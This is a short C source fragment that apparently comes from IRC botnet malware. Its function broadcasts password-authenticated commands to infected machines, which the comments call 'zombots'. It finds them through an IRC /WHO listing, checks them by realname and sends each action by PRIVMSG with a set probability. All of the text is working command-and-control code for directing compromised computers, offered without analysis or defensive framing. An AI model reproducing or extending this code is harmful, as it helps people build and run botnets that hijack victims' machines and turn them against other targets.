
// - distribute action between all zombots, using /WHO list
// - prob is a probability of sending single action to each zombot,
//   thus, to use about half of zombots use prob = 2, etc.
// - action must end with '/n',0

void cdecl irc_broadcast(int prob, char* format, ...)
{
  char msg[1024];

  va_list ap;
  va_start(ap, format);
  vsprintf(msg, format, ap);
  va_end(ap);

  if (strstri(msg, irc_psw)) return;

  irc_send("WHO *.*\n");

  for (;;)      // processing /WHO list
  {
    irc_recvline();
    if (irc_error) return;

    if (irc_rpl==RPL_WHOREPLY)
    {
//    irc_send("PRIVMSG xxx :host=%s nick=%s real=%s\n",
//      strv[5], strv[7], ptrv[10]);

      if (!strcmp(host2real(strv[5]), ptrv[10]))
      {
        if (!rnd(prob))
        {

          irc_send("PRIVMSG %s :%s %s", strv[7], irc_psw, msg);
          if (irc_error) return;

        } // rnd(...)==0
      } // realname auth ok
    } // /WHO line processing

    if (irc_rpl==RPL_ENDOFWHO) break;

  } // for (;;)
} // irc_broadcast
